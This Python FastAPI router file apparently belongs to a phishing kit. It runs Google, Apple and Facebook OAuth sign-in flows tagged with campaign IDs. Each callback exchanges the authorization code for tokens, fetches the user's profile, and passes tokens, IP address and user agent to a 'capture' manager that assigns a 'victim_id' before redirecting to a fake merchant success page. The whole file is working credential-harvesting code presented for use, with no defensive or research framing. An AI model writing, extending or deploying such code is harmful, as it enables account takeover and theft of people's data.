"""
OAuth Router
Google and Apple OAuth integration with credential capture
"""

import logging
import secrets
from datetime import datetime, timezone
from typing import Optional, Dict, Any
from urllib.parse import urlencode

from fastapi import APIRouter, HTTPException, status, Request, Query, Depends
from fastapi.responses import RedirectResponse, JSONResponse
from pydantic import BaseModel

from config import settings
from services.google_oauth import GoogleOAuthService
from services.apple_oauth import AppleOAuthService
from services.facebook_oauth import FacebookOAuthService
from services.oauth_manager import OAuthManager, OAuthProvider
from api.capture.oauth_capture import OAuthTokenCapture
from database.connection import get_database_connection

logger = logging.getLogger(__name__)

router = APIRouter()

# Initialize services
google_oauth_service = GoogleOAuthService()
apple_oauth_service = AppleOAuthService()
facebook_oauth_service = FacebookOAuthService()
oauth_manager = OAuthManager()
oauth_capture_manager = OAuthTokenCapture()

# Pydantic models
class OAuthState(BaseModel):
    state: str
    redirect_url: Optional[str] = None
    campaign_id: Optional[str] = None

class OAuthCallbackResponse(BaseModel):
    success: bool
    message: str
    user_info: Optional[Dict[str, Any]] = None
    redirect_url: Optional[str] = None

@router.get("/google/authorize")
async def google_authorize(
    request: Request,
    redirect_url: Optional[str] = Query(None),
    campaign_id: Optional[str] = Query(None)
):
    """Initiate Google OAuth flow"""
    try:
        # Generate state parameter for CSRF protection
        state = secrets.token_urlsafe(32)
        
        # Store state in session or database for validation
        state_data = {
            "state": state,
            "redirect_url": redirect_url,
            "campaign_id": campaign_id,
            "created_at": datetime.now(timezone.utc),
            "client_ip": request.client.host,
            "user_agent": request.headers.get("user-agent", "")
        }
        
        # Store state (in production, use Redis or database)
        # For now, we'll pass it in the callback
        
        # Build Google OAuth URL
        auth_url = google_oauth_service.get_authorization_url(
            state=state,
            redirect_uri=settings.GOOGLE_REDIRECT_URI
        )
        
        logger.info(f"Google OAuth initiated for campaign: {campaign_id}")
        
        return RedirectResponse(url=auth_url)
        
    except Exception as e:
        logger.error(f"Google OAuth authorization error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to initiate OAuth flow"
        )

@router.get("/google/callback")
async def google_callback(
    request: Request,
    code: str = Query(...),
    state: str = Query(...),
    error: Optional[str] = Query(None)
):
    """Handle Google OAuth callback"""
    try:
        # Check for OAuth errors
        if error:
            logger.warning(f"Google OAuth error: {error}")
            return JSONResponse(
                status_code=status.HTTP_400_BAD_REQUEST,
                content={
                    "success": False,
                    "message": f"OAuth error: {error}",
                    "redirect_url": "/merchant/auth_error.html"
                }
            )
        
        # Exchange authorization code for tokens
        token_data = await google_oauth_service.exchange_code_for_tokens(
            code=code,
            redirect_uri=settings.GOOGLE_REDIRECT_URI
        )
        
        if not token_data:
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="Failed to exchange authorization code"
            )
        
        # Get user profile information
        user_profile = await google_oauth_service.get_user_profile(
            access_token=token_data["access_token"]
        )
        
        if not user_profile:
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="Failed to get user profile"
            )
        
        # Capture OAuth data
        capture_data = {
            "provider": "google",
            "user_profile": user_profile,
            "token_data": token_data,
            "client_ip": request.client.host,
            "user_agent": request.headers.get("user-agent", ""),
            "state": state,
            "capture_timestamp": datetime.now(timezone.utc)
        }
        
        # Process OAuth capture
        victim_id = await oauth_capture_manager.process_oauth_capture(capture_data)
        
        if not victim_id:
            raise HTTPException(
                status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                detail="Failed to process OAuth capture"
            )
        
        # Log successful OAuth capture
        logger.info(f"Google OAuth capture successful for user: {user_profile.get('email')}")
        
        # Redirect to success page
        success_url = f"/merchant/auth_success.html?victim_id={victim_id}"
        
        return JSONResponse(
            status_code=status.HTTP_200_OK,
            content={
                "success": True,
                "message": "OAuth authentication successful",
                "user_info": {
                    "email": user_profile.get("email"),
                    "name": user_profile.get("name"),
                    "picture": user_profile.get("picture")
                },
                "redirect_url": success_url
            }
        )
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Google OAuth callback error: {e}")
        return JSONResponse(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            content={
                "success": False,
                "message": "Internal server error",
                "redirect_url": "/merchant/auth_error.html"
            }
        )

@router.get("/apple/authorize")
async def apple_authorize(
    request: Request,
    redirect_url: Optional[str] = Query(None),
    campaign_id: Optional[str] = Query(None)
):
    """Initiate Apple OAuth flow"""
    try:
        if not apple_oauth_service.is_configured():
            return JSONResponse(
                status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
                content={
                    "message": "Apple OAuth not configured",
                    "redirect_url": "/merchant/auth_signup.html"
                }
            )
        
        # Generate state parameter for CSRF protection
        state = secrets.token_urlsafe(32)
        
        # Store state in session or database for validation
        state_data = {
            "state": state,
            "redirect_url": redirect_url,
            "campaign_id": campaign_id,
            "created_at": datetime.now(timezone.utc),
            "client_ip": request.client.host,
            "user_agent": request.headers.get("user-agent", "")
        }
        
        # Build Apple OAuth URL
        auth_url = apple_oauth_service.get_authorization_url(
            state=state,
            redirect_uri=settings.APPLE_REDIRECT_URI
        )
        
        logger.info(f"Apple OAuth initiated for campaign: {campaign_id}")
        
        return RedirectResponse(url=auth_url)
        
    except Exception as e:
        logger.error(f"Apple OAuth authorization error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to initiate Apple OAuth flow"
        )

@router.get("/apple/callback")
async def apple_callback(
    request: Request,
    code: str = Query(...),
    state: str = Query(...),
    error: Optional[str] = Query(None)
):
    """Handle Apple OAuth callback"""
    try:
        # Check for OAuth errors
        if error:
            logger.warning(f"Apple OAuth error: {error}")
            return JSONResponse(
                status_code=status.HTTP_400_BAD_REQUEST,
                content={
                    "success": False,
                    "message": f"OAuth error: {error}",
                    "redirect_url": "/merchant/auth_error.html"
                }
            )
        
        # Exchange authorization code for tokens
        token_data = await apple_oauth_service.exchange_code_for_tokens(
            code=code,
            redirect_uri=settings.APPLE_REDIRECT_URI
        )
        
        if not token_data:
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="Failed to exchange authorization code"
            )
        
        # Get user profile information
        user_profile = apple_oauth_service.get_user_profile(
            id_token=token_data["id_token"]
        )
        
        if not user_profile:
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="Failed to get user profile"
            )
        
        # Capture OAuth data
        capture_data = {
            "provider": "apple",
            "user_profile": user_profile,
            "token_data": token_data,
            "client_ip": request.client.host,
            "user_agent": request.headers.get("user-agent", ""),
            "state": state,
            "capture_timestamp": datetime.now(timezone.utc)
        }
        
        # Process OAuth capture
        victim_id = await oauth_capture_manager.process_oauth_capture(capture_data)
        
        if not victim_id:
            raise HTTPException(
                status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                detail="Failed to process OAuth capture"
            )
        
        # Log successful OAuth capture
        logger.info(f"Apple OAuth capture successful for user: {user_profile.get('email')}")
        
        # Redirect to success page
        success_url = f"/merchant/auth_success.html?victim_id={victim_id}"
        
        return JSONResponse(
            status_code=status.HTTP_200_OK,
            content={
                "success": True,
                "message": "Apple OAuth authentication successful",
                "user_info": {
                    "email": user_profile.get("email"),
                    "name": user_profile.get("name"),
                    "first_name": user_profile.get("first_name"),
                    "last_name": user_profile.get("last_name")
                },
                "redirect_url": success_url
            }
        )
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Apple OAuth callback error: {e}")
        return JSONResponse(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            content={
                "success": False,
                "message": "Internal server error",
                "redirect_url": "/merchant/auth_error.html"
            }
        )

@router.get("/facebook/authorize")
async def facebook_authorize(
    request: Request,
    redirect_url: Optional[str] = Query(None),
    campaign_id: Optional[str] = Query(None)
):
    """Initiate Facebook OAuth flow"""
    try:
        if not facebook_oauth_service.is_configured():
            return JSONResponse(
                status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
                content={
                    "message": "Facebook OAuth not configured",
                    "redirect_url": "/merchant/auth_signup.html"
                }
            )
        
        # Generate state parameter for CSRF protection
        state = secrets.token_urlsafe(32)
        
        # Store state in session or database for validation
        state_data = {
            "state": state,
            "redirect_url": redirect_url,
            "campaign_id": campaign_id,
            "created_at": datetime.now(timezone.utc),
            "client_ip": request.client.host,
            "user_agent": request.headers.get("user-agent", "")
        }
        
        # Build Facebook OAuth URL
        auth_url = facebook_oauth_service.get_authorization_url(
            state=state,
            redirect_uri=settings.FACEBOOK_REDIRECT_URI
        )
        
        logger.info(f"Facebook OAuth initiated for campaign: {campaign_id}")
        
        return RedirectResponse(url=auth_url)
        
    except Exception as e:
        logger.error(f"Facebook OAuth authorization error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to initiate Facebook OAuth flow"
        )

@router.get("/facebook/callback")
async def facebook_callback(
    request: Request,
    code: str = Query(...),
    state: str = Query(...),
    error: Optional[str] = Query(None)
):
    """Handle Facebook OAuth callback"""
    try:
        # Check for OAuth errors
        if error:
            logger.warning(f"Facebook OAuth error: {error}")
            return JSONResponse(
                status_code=status.HTTP_400_BAD_REQUEST,
                content={
                    "success": False,
                    "message": f"OAuth error: {error}",
                    "redirect_url": "/merchant/auth_error.html"
                }
            )
        
        # Exchange authorization code for tokens
        token_data = await facebook_oauth_service.exchange_code_for_tokens(
            code=code,
            redirect_uri=settings.FACEBOOK_REDIRECT_URI
        )
        
        if not token_data:
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="Failed to exchange authorization code"
            )
        
        # Get user profile information
        user_profile = await facebook_oauth_service.get_user_profile(
            access_token=token_data["access_token"]
        )
        
        if not user_profile:
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="Failed to get user profile"
            )
        
        # Capture OAuth data
        capture_data = {
            "provider": "facebook",
            "user_profile": user_profile,
            "token_data": token_data,
            "client_ip": request.client.host,
            "user_agent": request.headers.get("user-agent", ""),
            "state": state,
            "capture_timestamp": datetime.now(timezone.utc)
        }
        
        # Process OAuth capture
        victim_id = await oauth_capture_manager.process_oauth_capture(capture_data)
        
        if not victim_id:
            raise HTTPException(
                status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                detail="Failed to process OAuth capture"
            )
        
        # Log successful OAuth capture
        logger.info(f"Facebook OAuth capture successful for user: {user_profile.get('email')}")
        
        # Redirect to success page
        success_url = f"/merchant/auth_success.html?victim_id={victim_id}"
        
        return JSONResponse(
            status_code=status.HTTP_200_OK,
            content={
                "success": True,
                "message": "Facebook OAuth authentication successful",
                "user_info": {
                    "email": user_profile.get("email"),
                    "name": user_profile.get("name"),
                    "first_name": user_profile.get("first_name"),
                    "last_name": user_profile.get("last_name"),
                    "picture": user_profile.get("picture")
                },
                "redirect_url": success_url
            }
        )
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Facebook OAuth callback error: {e}")
        return JSONResponse(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            content={
                "success": False,
                "message": "Internal server error",
                "redirect_url": "/merchant/auth_error.html"
            }
        )

@router.get("/providers")
async def get_oauth_providers():
    """Get available OAuth providers"""
    return oauth_manager.get_available_providers()

@router.post("/revoke")
async def revoke_oauth_tokens(
    provider: str,
    access_token: str,
    request: Request
):
    """Revoke OAuth tokens"""
    try:
        if provider == "google":
            success = await google_oauth_service.revoke_token(access_token)
        elif provider == "apple":
            success = await apple_oauth_service.revoke_token(access_token)
        elif provider == "facebook":
            success = await facebook_oauth_service.revoke_token(access_token)
        else:
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail=f"Unsupported provider: {provider}"
            )
        
        if success:
            logger.info(f"OAuth tokens revoked for provider: {provider}")
            return {"message": "Tokens revoked successfully"}
        else:
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="Failed to revoke tokens"
            )
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Token revocation error: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Internal server error"
        )
